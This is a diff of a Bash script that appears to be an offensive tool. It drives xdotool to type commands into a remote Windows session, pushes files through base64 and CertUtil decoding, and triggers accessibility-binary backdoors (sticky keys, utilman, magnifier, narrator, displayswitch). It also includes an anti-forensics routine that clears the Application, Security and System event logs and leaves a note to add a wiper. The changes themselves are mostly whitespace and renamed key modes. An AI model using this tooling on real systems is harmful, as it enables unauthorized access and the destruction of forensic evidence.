@@ -9,7 +9,7 @@ function print_status {
     # Bold Green for completed
     # Bold Yellow for warning
     # Bold Red for error
-    # * default to white 
+    # * default to white
     case $status in
         information) color="\033[34m[*]\033[0m" ;;
         progress) color="\033[1;34m[*]\033[0m" ;;
@@ -39,16 +39,20 @@ function check_dependencies() {
 function xdotool_return_input {
     local input=$1
     local key=$2
-    
+
     if [ "$key" = "return" ]
     then
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type -- "$input"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+	elif [ "$key" = "escapechars" ]
+	then
+		xdotool search --name "$WINDOWNAME" windowfocus windowactivate type -- "$input"
+		xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
     elif [ "$key" = "copycon" ]
     then
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate type -- "$input"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
-    elif [ "$key" = "custom" ]
+    elif [ "$key" = "customkey" ]
     then
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key "$input"
     fi
@@ -58,13 +62,13 @@ function random_string {
     local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
     local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
     local string=""
-    
+
     for (( i=0; i<$length; i++ ))
     do
         local random_index=$(( RANDOM % ${#characters} ))
         string+=${characters:$random_index:1}
     done
-    
+
     echo "$string"
 }
 
@@ -74,7 +78,7 @@ function CmdFile {
     echo print_status "progress" "Executing commands..."
     while read -r line
     do
-        xdotool_return_input "$line" "return"
+        xdotool_return_input "$line" "escapechars"
     done < "$file"
     echo print_status "completed" "Task completed!"
 }
@@ -86,7 +90,7 @@ function Execute {
     case $method in
         none)
             print_status "progress" "Executing commands..."
-            xdotool_return_input "$commands" "return"
+            xdotool_return_input "$commands" "escapechars"
             print_status "completed" "Task completed!"
             ;;
         dialogbox)
@@ -114,8 +118,8 @@ function DialogBox {
     fi
 
     print_status "progress" "Executing commands..."
-    xdotool_return_input "Super+r" "custom"
-    xdotool_return_input "$commands" "return"
+    xdotool_return_input "Super+r" "customkey"
+    xdotool_return_input "$commands" "escapechars"
     print_status "completed" "Task completed!"
 }
 
@@ -165,7 +169,7 @@ function Base64 {
     local output_file=$2
     local platform=$3
     local mode=$4
-    
+
     local random1=$(random_string)
     local random2=$(random_string)
 
@@ -174,33 +178,33 @@ function Base64 {
     if [[ -f "$input" && ("$platform" = "windows" || "$platform" = "linux") && "$mode" = "powershell" ]]
     then
         file_type=$(file "$input")
-        
+
         if [[ "$file_type" == *"ASCII text"* ]]
         then
             file=$(iconv -f ASCII -t UTF-16LE "$input" | base64 -w 0)
         else
             file=$(base64 -w 0 "$input")
         fi
-        
+
         base64_decoder=$(cat <<EOF
 \$${random1} = "$file"
 \[byte[]]\$${random2} = [Convert]::FromBase64String(\$${random1})
 [IO.File]::WriteAllBytes("$output_file", \$${random2})
 EOF
 )
-        print_status "progress" "Checking one of the lines reaches 3477 character limit"
-        while read -r line
-        do
-            length=$(echo -n "$line" | wc -c)
-            if [ "$length" -ge 3477 ]
-            then
-                print_status "error" "Character Limit reached!"
-                print_status "information" "Use 'pwshcertutil' as a method instead."
-                print_status "information" "Terminating program..."
-                exit 1
-            fi
-        done <<< "$base64_decoder"
-        
+        #print_status "progress" "Checking one of the lines reaches 3477 character limit"
+        #while read -r line
+        #do
+        #    length=$(echo -n "$line" | wc -c)
+        #    if [ "$length" -ge 3477 ]
+        #    then
+        #        print_status "error" "Character Limit reached!"
+        #        print_status "information" "Use 'pwshcertutil' as a method instead."
+        #        print_status "information" "Terminating program..."
+        #        exit 1
+        #    fi
+        #done <<< "$base64_decoder"
+
         print_status "progress" "Transferring file..."
         while IFS= read -r line
         do
@@ -223,14 +227,14 @@ function PowershellOutFile {
     local output_file=$2
     local platform=$3
     local mode=$4
-    
+
     local random_temp=$(random_string)
-    
+
     if [[ "$platform" != "windows" && "$platform" != "linux" ]]
     then
         print_status "error" "Only windows and linux are supported for this method!"
     fi
-    
+
     if [ -f "$input" ]
     then
         if [ "$mode" = "text" ]
@@ -250,41 +254,41 @@ function PowershellOutFile {
                         exit 1
                     fi
                 done < "$input"
-                
+
                 echo print_status "progress" "Transferring file..."
-                xdotool_return_input "@'" "return"
+                xdotool_return_input "@'" "escapechars"
                 while read -r line
                 do
                     xdotool_return_input "$line" "return"
                 done < "$input"
-                
-                xdotool_return_input "'@ | Out-File $output_file" "return"
+
+                xdotool_return_input "'@ | Out-File $output_file" "escapechars"
             else
                 echo print_status "warning" "This is a binary file! Switching to 'pwshcertutil' method instead..."
                 PowershellOutFile "$input" "$output_file" "$platform" "certutil"
             fi
-            
-            
+
+
         elif [ "$mode" = "certutil" ]
         then
             print_status "progress" "Transferring file..."
             base64_data=$(base64 -w 64 "$input")
-            xdotool_return_input "@'" "return"
-            xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
-            
+            xdotool_return_input "@'" "escapechars"
+            xdotool_return_input "-----BEGIN CERTIFICATE-----" "escapechars"
+
             while IFS= read -r line
             do
                 xdotool_return_input "$line" "return"
             done <<< "$base64_data"
-            
-            xdotool_return_input "-----END CERTIFICATE-----" "return"
-            xdotool_return_input "'@ | Out-File ${random_temp}.txt" "return"
+
+            xdotool_return_input "-----END CERTIFICATE-----" "escapechars"
+            xdotool_return_input "'@ | Out-File ${random_temp}.txt" "escapechars"
             xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
-            
+
             xdotool_return_input "Remove-Item -Force ${random_temp}.txt" "return"
         fi
     fi
-    
+
     print_status "completed" "File transferred!"
 }
 
@@ -293,7 +297,7 @@ function CopyCon {
     local output_file=$2
     local platform=$3
     local mode=$4
-    
+
     local random_temp=$(random_string)
 
     if [ "$platform" != "windows" ]
@@ -303,7 +307,7 @@ function CopyCon {
         print_status "information" "Terminating program..."
         exit 1
     fi
-    
+
     if [[ -f "$input" && "$mode" = "text" ]]
     then
         print_status "progress" "Checking one of the lines reaches 255 character limit"
@@ -338,7 +342,7 @@ function CopyCon {
     elif [ "$mode" = "base64" ]
     then
         file_type=$(file "$input")
-        
+
         if [[ "$file_type" == *"ASCII text"* ]]
         then
             string_base64=$(iconv -f ASCII -t UTF-16LE "$input" | base64 -w 64)
@@ -348,13 +352,13 @@ function CopyCon {
 
         print_status "progress" "Transferring file..."
         xdotool_return_input "copy con ${random_temp}.txt" "return"
-        xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
-        
+        xdotool_return_input "-----BEGIN CERTIFICATE-----" "escapechars"
+
         while IFS= read -r line
         do
             xdotool_return_input "$line" "return"
         done <<< "$string_base64"
-        
+
         xdotool_return_input "-----END CERTIFICATE-----" "copycon"
         xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
         xdotool_return_input "del /f ${random_temp}.txt" "return"
@@ -383,7 +387,7 @@ EOF
 
     if [ "$mode" = "info" ]
     then
-        echo "$description"   
+        echo "$description"
     else
         print_status "error" "Invalid mode!"
     fi
@@ -411,7 +415,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
-        xdotool_return_input "shift shift shift shift shift" "custom"
+        xdotool_return_input "shift shift shift shift shift" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -440,7 +444,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        xdotool_return_input "Super+u" "custom"
+        xdotool_return_input "Super+u" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -462,15 +466,15 @@ EOF
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
-    
+
     if [ "$mode" = "info" ]
     then
         echo "$description"
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
-        xdotool_return_input "Super+equal" "custom"
-        xdotool_return_input "Super+minus" "custom"
+        xdotool_return_input "Super+equal" "customkey"
+        xdotool_return_input "Super+minus" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -499,7 +503,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
-        xdotool_return_input "Super+Return" "custom"
+        xdotool_return_input "Super+Return" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -528,7 +532,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
-        xdotool_return_input "Super+p" "custom"
+        xdotool_return_input "Super+p" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -614,7 +618,7 @@ EOF
         echo "$description"
     elif [ "$mode" = "execute" ]
     then
-        Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
+        Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
     elif [ "$mode" = "script" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
@@ -654,7 +658,7 @@ function AntiForensics {
 
     # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
     # -p <windows | linux> -m <wevutil | winevent>
-    
+
     # Batch script
     # Powershell script
     # Bash script
@@ -805,7 +809,7 @@ function main() {
         # Check if a file is passed as input
         CmdFile "$COMMAND"
     fi
-    
+
     if [[ ! -f "$COMMAND" && -n "$COMMAND" ]]
     then
         # When input is string and not a file. It executes command
@@ -815,7 +819,7 @@ function main() {
         fi
         Execute "$COMMAND" "$METHOD"
     fi
-    
+
     # File transfer
     if [[ -f "$INPUT" && -n "$OUTPUT" ]]
     then
